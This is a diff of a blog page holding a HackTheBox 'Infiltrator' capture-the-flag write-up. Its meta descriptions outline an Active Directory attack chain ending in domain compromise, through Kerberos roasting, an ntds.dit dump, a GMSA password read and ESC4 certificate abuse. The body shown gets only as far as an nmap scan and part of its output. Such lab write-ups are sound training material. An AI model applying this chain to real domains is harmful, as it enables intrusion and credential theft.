@@ -6,7 +6,7 @@
 			else document.documentElement.removeAttribute('data-theme');
 		} catch {}
 	})();
-</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0623-infiltrator/"><!-- Primary Meta Tags --><title>Infiltrator · Zumpyx&#39;s Blog</title><meta name="description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn&amp;amp;#039;t have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application&amp;amp;#039;s API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator&amp;amp;#039;s hash and compromise the whole domain through the certificate exploitation."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0623-infiltrator/"><meta property="og:title" content="Infiltrator · Zumpyx's Blog"><meta property="og:description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn&amp;amp;#039;t have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application&amp;amp;#039;s API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator&amp;amp;#039;s hash and compromise the whole domain through the certificate exploitation."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0623-infiltrator/"><meta name="twitter:title" content="Infiltrator · Zumpyx's Blog"><meta name="twitter:description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn&amp;amp;#039;t have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application&amp;amp;#039;s API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator&amp;amp;#039;s hash and compromise the whole domain through the certificate exploitation."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.CMmW25g2.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0623-infiltrator/"><!-- Primary Meta Tags --><title>Infiltrator · Zumpyx&#39;s Blog</title><meta name="description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn't have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application's API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator's hash and compromise the whole domain through the certificate exploitation."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0623-infiltrator/"><meta property="og:title" content="Infiltrator · Zumpyx's Blog"><meta property="og:description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn't have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application's API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator's hash and compromise the whole domain through the certificate exploitation."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0623-infiltrator/"><meta name="twitter:title" content="Infiltrator · Zumpyx's Blog"><meta name="twitter:description" content="Infiltrator is an Insane Windows Active Directory machine that starts with a website that an attacker can scrape for possible usernames on the machine. One user doesn't have Kerberos pre-authentication enabled, and his password can be cracked. Afterwards, an intricate attack chain focused on Active Directory permissions allows the attacker to get access to the machine over WinRM as the user `M.harris`. Once on the machine, the attacker can identify that the whole company communicates through the `Output Messenger` application. Infiltrating the application, switching users, reverse engineering a binary, and using the application's API, he can eventually land a shell as the user `O.martinez` on the remote machine. Afterwards, he discovers a network capture file with a backup archive and a BitLocker volume recovery key. Unlocking the volume, another backup folder contains an `ntds.dit` file from which he can read sensitive user information and find a valid password for the user `lan_managment`. This new user can read the GMSA password of the user `infiltrator_svc$`. This last user can exploit a vulnerable ESC4 certificate template. Finally, he can get the Administrator's hash and compromise the whole domain through the certificate exploitation."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.CMmW25g2.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}.meta .badge.locked{color:var(--medium,#fc0);background:#ffcc001a;border-color:#ffcc0059}
 </style><link rel="stylesheet" href="/_astro/ArticleLayout.DA3idRZl.css"><style>.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
 </style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx&#39;s Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
 	(() => {
@@ -70,19 +70,693 @@
 			});
 		} catch {}
 	})();
-</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="article-shell" data-astro-cid-sgg5joot><div class="prose" data-article-body data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-08-31T00:00:00.000Z">2024-08-31</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.BKd6WVan_eERjV.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>Infiltrator</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#623</span><span class="badge difficulty-insane" data-astro-cid-twh6cqtg>Insane</span><span class="badge" data-astro-cid-twh6cqtg>Windows</span><span class="badge" data-astro-cid-twh6cqtg>WIP</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><div class="content" data-article-content data-astro-cid-sgg5joot><h2 id="用到的工具">用到的工具</h2>
-<ul>
-<li>nmap</li>
-</ul>
-<h2 id="recon--enum">Recon &amp; Enum</h2>
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="article-shell" data-astro-cid-sgg5joot><div class="prose" data-article-body data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-08-31T00:00:00.000Z">2024-08-31</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.BKd6WVan_eERjV.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>Infiltrator</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#623</span><span class="badge difficulty-insane" data-astro-cid-twh6cqtg>Insane</span><span class="badge" data-astro-cid-twh6cqtg>Windows</span><span class="badge" data-astro-cid-twh6cqtg>AS-REP_Roasting</span><span class="badge" data-astro-cid-twh6cqtg>ActiveDirectory</span><span class="badge" data-astro-cid-twh6cqtg>密码喷射</span><span class="badge" data-astro-cid-twh6cqtg>BloodHound</span><span class="badge" data-astro-cid-twh6cqtg>OutPutMessenger</span><span class="badge" data-astro-cid-twh6cqtg>CodemerxDecompile</span><span class="badge" data-astro-cid-twh6cqtg>Wireshark</span><span class="badge" data-astro-cid-twh6cqtg>John</span><span class="badge" data-astro-cid-twh6cqtg>BitLocker</span><span class="badge" data-astro-cid-twh6cqtg>ntdsdotsqlite</span><span class="badge" data-astro-cid-twh6cqtg>GMSA</span><span class="badge" data-astro-cid-twh6cqtg>ADCS</span><span class="badge" data-astro-cid-twh6cqtg>ESC4</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><div class="content" data-article-content data-astro-cid-sgg5joot><h2 id="recon--enum">Recon &amp; Enum</h2>
 <h3 id="port-scan">Port Scan</h3>
-<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">nmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -sC</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -sV</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -p-</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --min-rate</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 1000</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -T4</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -oA</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> log/nmap</span></span></code></pre>
-<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PORT     STATE SERVICE  VERSION</span></span></code></pre>
-<h2 id="shell-as-user">Shell as User</h2>
-<h3 id="exploit">Exploit</h3>
-<h3 id="local-enum">Local Enum</h3>
-<h2 id="shell-as-root">Shell as Root</h2>
-<h2 id="dump-hash">Dump Hash</h2>
-<h2 id="more-and-more">More and More</h2>
-<h3 id="other">Other</h3>
-</div></div><aside class="toc" data-toc hidden aria-label="目录" data-astro-cid-sgg5joot><p class="toc-label" data-astro-cid-sgg5joot>目录</p><nav class="toc-nav" data-toc-nav data-astro-cid-sgg5joot></nav></aside></div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer><script type="module">function e(e){return e.trim().toLowerCase().replace(/\s+/g,`-`).replace(/[^\w\u4e00-\u9fff-]+/g,``).replace(/-+/g,`-`).replace(/^-|-$/g,``)||`section`}var t=document.querySelector(`[data-article-content]`),n=document.querySelector(`[data-toc]`),r=document.querySelector(`[data-toc-nav]`);if(!(!t||!n||!r)){let i=Array.from(t.querySelectorAll(`h2, h3`)).filter(e=>(e.textContent??``).trim().length>0);if(i.length===0)n.hidden=!0;else{n.hidden=!1;let t=new Set,a=[];for(let n of i){let i=n.id;if(!i){let r=e(n.textContent??``);i=r;let a=2;for(;t.has(i)||document.getElementById(i);)i=`${r}-${a}`,a+=1;n.id=i}t.add(i);let o=document.createElement(`a`);o.href=`#${i}`,o.textContent=(n.textContent??``).trim(),o.className=n.tagName===`H3`?`toc-h3`:`toc-h2`,o.dataset.target=i,r.appendChild(o),a.push(o)}let o=e=>{for(let t of a)t.classList.toggle(`active`,t.dataset.target===e)},s=new IntersectionObserver(e=>{let t=e.filter(e=>e.isIntersecting).sort((e,t)=>e.target.offsetTop-t.target.offsetTop);t[0]&&o(t[0].target.id)},{rootMargin:`-15% 0px -70% 0px`,threshold:[0,1]});for(let e of i)s.observe(e);location.hash?o(decodeURIComponent(location.hash.slice(1))):i[0]&&o(i[0].id)}}</script></body></html>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>PORT      STATE SERVICE       VERSION</span></span>
+<span class="line"><span>53/tcp    open  domain        Simple DNS Plus</span></span>
+<span class="line"><span>80/tcp    open  http          Microsoft IIS httpd 10.0</span></span>
+<span class="line"><span>| http-methods: </span></span>
+<span class="line"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST</span></span>
+<span class="line"><span>|_  Potentially risky methods: TRACE</span></span>
+<span class="line"><span>|_http-server-header: Microsoft-IIS/10.0</span></span>
+<span class="line"><span>|_http-title: Infiltrator.htb</span></span>
+<span class="line"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-14 00:14:19Z)</span></span>
+<span class="line"><span>135/tcp   open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></span>
+<span class="line"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span></span>
+<span class="line"><span>| ssl-cert: Subject: </span></span>
+<span class="line"><span>| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span></span>
+<span class="line"><span>| Issuer: commonName=infiltrator-DC01-CA</span></span>
+<span class="line"><span>| Public Key type: rsa</span></span>
+<span class="line"><span>| Public Key bits: 2048</span></span>
+<span class="line"><span>| Signature Algorithm: sha256WithRSAEncryption</span></span>
+<span class="line"><span>| Not valid before: 2024-08-04T18:48:15</span></span>
+<span class="line"><span>| Not valid after:  2099-07-17T18:48:15</span></span>
+<span class="line"><span>| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span></span>
+<span class="line"><span>|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span></span>
+<span class="line"><span>|_ssl-date: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span></span>
+<span class="line"><span>445/tcp   open  microsoft-ds?</span></span>
+<span class="line"><span>464/tcp   open  kpasswd5?</span></span>
+<span class="line"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span>
+<span class="line"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span></span>
+<span class="line"><span>|_ssl-date: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span></span>
+<span class="line"><span>| ssl-cert: Subject: </span></span>
+<span class="line"><span>| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span></span>
+<span class="line"><span>| Issuer: commonName=infiltrator-DC01-CA</span></span>
+<span class="line"><span>| Public Key type: rsa</span></span>
+<span class="line"><span>| Public Key bits: 2048</span></span>
+<span class="line"><span>| Signature Algorithm: sha256WithRSAEncryption</span></span>
+<span class="line"><span>| Not valid before: 2024-08-04T18:48:15</span></span>
+<span class="line"><span>| Not valid after:  2099-07-17T18:48:15</span></span>
+<span class="line"><span>| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span></span>
+<span class="line"><span>|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span></span>
+<span class="line"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span></span>
+<span class="line"><span>|_ssl-date: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span></span>
+<span class="line"><span>| ssl-cert: Subject: </span></span>
+<span class="line"><span>| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span></span>
+<span class="line"><span>| Issuer: commonName=infiltrator-DC01-CA</span></span>
+<span class="line"><span>| Public Key type: rsa</span></span>
+<span class="line"><span>| Public Key bits: 2048</span></span>
+<span class="line"><span>| Signature Algorithm: sha256WithRSAEncryption</span></span>
+<span class="line"><span>| Not valid before: 2024-08-04T18:48:15</span></span>
+<span class="line"><span>| Not valid after:  2099-07-17T18:48:15</span></span>
+<span class="line"><span>| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span></span>
+<span class="line"><span>|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span></span>
+<span class="line"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span></span>
